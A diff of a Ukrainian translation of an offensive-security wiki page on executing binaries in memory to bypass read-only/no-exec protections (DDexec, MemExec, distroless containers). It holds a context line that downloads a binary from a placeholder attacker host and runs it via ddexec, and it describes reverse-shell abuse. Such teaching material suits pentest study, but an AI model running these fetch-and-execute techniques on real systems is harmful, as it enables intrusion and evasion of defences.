@@ -15,9 +15,9 @@ Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="
 </details>
 {% endhint %}
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_вимагається вільне володіння польською мовою в письмовій та усній формі_).
+If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_вимагається вільне володіння польською мовою в усній та письмовій формі_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
@@ -94,7 +94,7 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec) є природним наступним кроком DDexec. Це **DDexec shellcode demonised**, тому що щоразу, коли ви хочете **запустити інший бінарний файл**, вам не потрібно перезапускати DDexec, ви можете просто запустити shellcode memexec через техніку DDexec, а потім **спілкуватися з цим демоном, щоб передати нові бінарні файли для завантаження та виконання**.
+[**Memexec**](https://github.com/arget13/memexec) є природним наступним кроком DDexec. Це **DDexec shellcode demonised**, тому що щоразу, коли ви хочете **запустити інший бінарний файл**, вам не потрібно перезапускати DDexec, ви можете просто запустити shellcode memexec за допомогою техніки DDexec, а потім **спілкуватися з цим демоном, щоб передати нові бінарні файли для завантаження та виконання**.
 
 Ви можете знайти приклад того, як використовувати **memexec для виконання бінарних файлів з PHP реверс-шелу** за адресою [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
 
@@ -124,15 +124,15 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 Використовуючи скриптову мову, ви могли б **перерахувати систему**, використовуючи можливості мови.
 {% endhint %}
 
-Якщо немає **захистів `read-only/no-exec`**, ви могли б зловживати своїм реверс-шелом, щоб **записати у файлову систему свої бінарні файли** та **виконати** їх.
+Якщо немає **захистів `read-only/no-exec`**, ви могли б зловживати своїм реверс-шелом, щоб **записувати у файлову систему свої бінарні файли** та **виконувати** їх.
 
 {% hint style="success" %}
 Однак у таких контейнерах ці захисти зазвичай існують, але ви могли б використовувати **попередні техніки виконання в пам'яті, щоб обійти їх**.
 {% endhint %}
 
-Ви можете знайти **приклади** того, як **використовувати деякі вразливості RCE**, щоб отримати реверс-шели скриптових мов та виконати бінарні файли з пам'яті за адресою [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+Ви можете знайти **приклади** того, як **використовувати деякі вразливості RCE**, щоб отримати реверс-шели скриптових мов та виконувати бінарні файли з пам'яті за адресою [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Якщо вас цікавить **кар'єра в хакерстві** та зламати незламне - **ми наймаємо!** (_вимагається вільне володіння польською мовою в письмовій та усній формі_).
 
